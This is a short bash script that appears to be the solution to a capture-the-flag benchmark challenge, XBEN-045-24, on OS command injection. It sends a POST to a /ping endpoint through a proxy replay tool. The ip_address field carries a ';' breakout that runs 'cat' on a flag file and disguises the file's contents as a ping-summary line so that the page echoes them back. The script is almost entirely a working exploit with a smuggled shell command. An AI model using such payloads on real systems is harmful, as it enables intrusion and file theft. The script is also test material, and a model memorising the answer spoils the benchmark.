#!/usr/bin/env bash
# XBEN-045-24 — OS command injection. Proxy-mode twin. /ping passes ip_address
# to a shell; a `;` breaks out and the flag file's contents are smuggled back
# inside the ping-summary line the page echoes.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
FILE="${2:-/FLAG.txt}"
SESSION="xben045p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/"
BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/ping' \
  --set "form.ip_address=;echo \"\$(cat $FILE) packets transmitted, 1 received, 0% packet loss\";#" >/dev/null
print_flag
